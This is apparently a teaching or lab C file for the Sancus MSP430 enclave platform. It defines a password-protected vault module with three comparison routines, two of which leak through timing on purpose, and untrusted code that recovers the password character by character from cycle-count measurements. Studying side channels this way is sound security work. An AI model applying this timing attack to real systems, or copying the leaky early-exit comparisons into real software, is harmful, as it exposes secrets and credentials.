#include <sancus_support/sm_io.h>
#include <sancus_support/timer.h>
#include <sancus/sm_support.h>
#include <string.h>
#include <msp430.h>

#define CAT(x) #x
#define BUF_LEN 128
void leak_timing1(void);
void leak_timing2(void);
void leak_timing3(void);
void exit_success(void);

/* ======== VAULT WORLD SM ======== */

DECLARE_SM(vault, 0x1234);
#define VAULT_SECRET_CST    0xbeef
#define VAULT_PW_C1         'c'
#define VAULT_PW_C2         'a'
#define VAULT_PW_C3         'f'
#define VAULT_PW_C4         'e'
#define VAULT_PW_C5         '\0'
#define VAULT_PASSWD        "cafe"
#define VAULT_PASSWD_LEN    5 //8+1 for null byte

int SM_DATA(vault) vault_initialized;
int SM_DATA(vault) vault_secret;
char SM_DATA(vault) vault_passwd[VAULT_PASSWD_LEN];
int const SM_DATA(vault) vault_secret_const = VAULT_SECRET_CST;
char const SM_DATA(vault) vault_passwd_const1 = VAULT_PW_C1;
char const SM_DATA(vault) vault_passwd_const2 = VAULT_PW_C2;
char const SM_DATA(vault) vault_passwd_const3 = VAULT_PW_C3;
char const SM_DATA(vault) vault_passwd_const4 = VAULT_PW_C4;
char const SM_DATA(vault) vault_passwd_const5 = VAULT_PW_C5;

void SM_ENTRY(vault) vault_init()
{
    if (!vault_initialized)
    {
        // copy the constant chars into the buffer for the passwd
        __asm__ __volatile__(   "push r4                        \n\t"
                                "push r5                        \n\t"
                                "mov #vault_passwd, r5          \n\t"
                                "mov #vault_passwd_const1, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const2, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const3, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const4, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const5, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "pop r5                         \n\t"
                                "pop r4                         \n\t"
                                );
        vault_secret = vault_secret_const;
        vault_initialized = 1;
    }
}

/**
 * Returns 0 on failure, and the secret on success
 * Contains a simple timing sidechannel
 * */
int SM_ENTRY(vault) get_secret_timing1(char* provided_passwd)
{
    int len = VAULT_PASSWD_LEN;
    /*
     * Provided password must match password exactly, including the nullbyte at the end
     * This prevents provided password from being accepted if it starts with passwd
     */
    for (int i = 0; i < len; i++)
    {
        if (provided_passwd[i] != vault_passwd[i])
            return 0;
    }
    return vault_secret;
}

/**
 * Returns 0 on failure, and the secret on success
 * Contains a slightly more complicated timing sidechannel
 * */
int SM_ENTRY(vault) get_secret_timing2(char* provided_passwd)
{
    int len = VAULT_PASSWD_LEN;
    int rv, success = 1;
    
    /*
     * Provided password must match password exactly, including the nullbyte at the end
     * This prevents provided password from being accepted if it starts with passwd
     */
    for (int i = 0; i < len; i++)
    {
        if (provided_passwd[i] != vault_passwd[i])
            success = 0;
    }
    // change this into assembly to ensure that amount of cycles is not dependant on success
    /*
    if (success)
    {
        rv = vault_secret;
    }
    else
    {
        rv = 0;
    }
    */
    __asm__("tst %1                                                         \n\t"
            "jz iszero                                                      \n\t"
            "mov &vault_secret, %0; success != 0: thus rv=secret. 3 cycles  \n\t"
            "jmp end  ; skip the rest. 2 cycles                             \n\t"
            "iszero: mov #0, %0 ; success==0, so rv=0. 1 cycle              \n\t"
            "nop  ; necessary for timing channel. 1 cycle                   \n\t"
            "nop  ; necessary for timing channel. 1 cycle                   \n\t"
            "nop  ; necessary for timing channel. 1 cycle                   \n\t"
            "nop  ; necessary for timing channel. 1 cycle                   \n\t"
            "end: nop ; end of assembly                                     \n\t"
            : "=r" (rv)
            : "r" (success)
            : "r7"
            );
    return rv;
}

/**
 * Returns 0 on failure, and the secret on success
 * Contains a slightly more complicated timing sidechannel
 * */
int SM_ENTRY(vault) get_secret_timing3(char* provided_passwd)
{
    int len = VAULT_PASSWD_LEN;
    int rv, success = 1;
    
    /*
     * Provided password must match password exactly, including the nullbyte at the end
     * This prevents provided password from being accepted if it starts with passwd
     */
    /*
    for (int i = 0; i < len; i++)
    {
        if (provided_passwd[i] != vault_passwd[i])
            success = 0;
        else
            __asm__("nop\n\t"); // prevent sidechannel timing attack
    }
    */
    /*
     * 
     * r7 = success
     * r8 = provided_passwd[i]
     * index in r9
     * r10 = vault_passwd[i]
     * rv in %0
     * addr to provdided_passwd in %1
     * len in %2
     * 
     */
    __asm__ __volatile__(   "mov #0x0, r7; success = 0      \n\t"
                            "mov #0x0, r9; i = 0            \n\t"
                            "beginLp: cmp r9, %2            \n\t"
                            "jeq endLp                      \n\t"
                            "mov %1, r8                     \n\t"
                            "add r9, r8                     \n\t"
                            "mov r9, r10                    \n\t"
                            "add #vault_passwd, r10         \n\t"
                            "mov.b @(r8), r5                \n\t"
                            "mov.b @(r10), r6               \n\t"
                            "cmp.b @(r8), @(r10)            \n\t"
                            "jeq eqLp                       \n\t"
                            "mov #0xfedc, r7                \n\t"
                            "jmp epilogueLp                 \n\t"
                            "eqLp: nop                      \n\t"
                            "nop                            \n\t"
                            "nop                            \n\t"
                            "nop                            \n\t"
                            "epilogueLp: inc r9 ; i++       \n\t"
                            "jmp beginLp ; goto begin       \n\t"
                            "endLp: tst r7; success ?= 0    \n\t"
                            "jz ok                          \n\t"
                            "mov #0x0, %0 ; rv = 0          \n\t"
                            "jmp end3                       \n\t"
                            "ok: mov &vault_secret, %0;     \n\t"
                            "nop                            \n\t"
                            "end3: nop                      \n\t"
                            : "=r" (rv)
                            : "r" (provided_passwd), "r" (len)
                            : "r5", "r6", "r7", "r8", "r9", "r10");
    
    // change this into assembly to ensure that amount of cycles is not dependant on success
    /*
    if (success)
    {
        rv = vault_secret;
    }
    else
    {
        rv = 0;
    }
    */
    /*
    __asm__("tst %1                                                         \n\t"
            "jz iszero2                                                     \n\t"
            "mov &vault_secret, %0; success != 0: thus rv=secret. 3 cycles  \n\t"
            "jmp end2  ; skip the rest. 2 cycles                            \n\t"
            "iszero2: mov #0, %0 ; success==0, so rv=0. 1 cycles            \n\t"
            "nop  ; necessary for timing channel. 1 cycle                   \n\t"
            "nop  ; necessary for timing channel. 1 cycle                   \n\t"
            "nop  ; necessary for timing channel. 1 cycle                   \n\t"
            "nop  ; necessary for timing channel. 1 cycle                   \n\t"
            "end2: nop ; end of assembly                                    \n\t"
            : "=r" (rv)
            : "r" (success)
            : "r7"
            );
    */
    return rv;
}

void SM_ENTRY(vault) vault_disable(void)
{
    sancus_disable(exit_success);
}

/* ======== UNTRUSTED CONTEXT ======== */

int main(void)
{
    // necessary init
    msp430_io_init();
    
    // enable sm
    sancus_enable(&vault);
    vault_init();
    
    // leak different func
    ASSERT(get_secret_timing1(VAULT_PASSWD) == VAULT_SECRET_CST);
    leak_timing1();
    ASSERT(get_secret_timing2(VAULT_PASSWD) == VAULT_SECRET_CST);
    leak_timing2();
    ASSERT(get_secret_timing3(VAULT_PASSWD) == VAULT_SECRET_CST);
    leak_timing3();
    vault_disable();
    
}

void leak_timing1(void)
{
    int duration;
    /*
     * Holds our current guess
     * Assume all passwords are less than 128 chars
     */
    char current[BUF_LEN] = {0};
    // tracks length of current guess without null byte
    char current_len = 0;
    
    // repeatedly bruteforce one char at a time for timing channel 1
    while (!get_secret_timing1(current))
    {
        int valid = 0;
        char bestChar = '\0';
        unsigned int bestTime = 0xffff;
        for (char c = '0'; c <= 'z'; c++)
        {
            current[current_len] = c;
            timer_tsc_start();
            volatile int v = get_secret_timing1(current);
            duration = timer_tsc_end();
            if (!valid || duration > bestTime)
            {
                bestTime = duration;
                bestChar = c;
                valid = 1;
            }
        }
        printf("Best char: 0x%.2x\n", bestChar);
        // write best char into buf and continue with next char
        current[current_len] = bestChar;
        current_len++;
    }
    printf("Recovered passwd: %s\n", current);
}

void leak_timing2(void)
{
    int duration;
    /*
     * Holds our current guess
     * Assume all passwords are less than 128 chars
     */
    char current[BUF_LEN] = {0};
    // tracks length of current guess without null byte
    char current_len = 0;
    
    // repeatedly bruteforce one char at a time for timing channel 1
    while (!get_secret_timing2(current))
    {
        int valid = 0;
        char bestChar = '\0';
        unsigned int bestTime = 0xffff;
        for (char c = '0'; c <= 'z'; c++)
        {
            current[current_len] = c;
            timer_tsc_start();
            volatile int v = get_secret_timing2(current);
            duration = timer_tsc_end();
            if (!valid || duration < bestTime)
            {
                bestTime = duration;
                bestChar = c;
                valid = 1;
            }
        }
        printf("Best char: 0x%.2x\n", bestChar);
        // write best char into buf and continue with next char
        current[current_len] = bestChar;
        current_len++;
    }
    printf("Recovered passwd: %s\n", current);
}

void leak_timing3(void)
{
    int duration;
    /*
     * Holds our current guess
     * Assume all passwords are less than 128 chars
     */
    char current[BUF_LEN] = {0};
    // tracks length of current guess without null byte
    char current_len = 0;
    
    // repeatedly bruteforce one char at a time for timing channel 1
    while (!get_secret_timing3(current) && current_len < VAULT_PASSWD_LEN)
    {
        int valid = 0;
        char bestChar = '\0';
        unsigned int bestTime = 0xffff;
        for (char c = 'a'; c <= 'g'; c++)
        {
            current[current_len] = c;
            timer_tsc_start();
            volatile int v = get_secret_timing3(current);
            duration = timer_tsc_end();
            if (!valid)
            {
                bestTime = duration;
                bestChar = c;
                valid = 1;
            }
            else
            {
                ASSERT(duration == bestTime);
            }
        }
        printf("Best char: 0x%.2x\n", bestChar);
        // write best char into buf and continue with next char
        current[current_len] = bestChar;
        current_len++;
    }
    printf("Recovered passwd: %s\n", current);
}

void exit_success(void)
{
    //pr_info("SM disabled; all done!");
    EXIT();
}
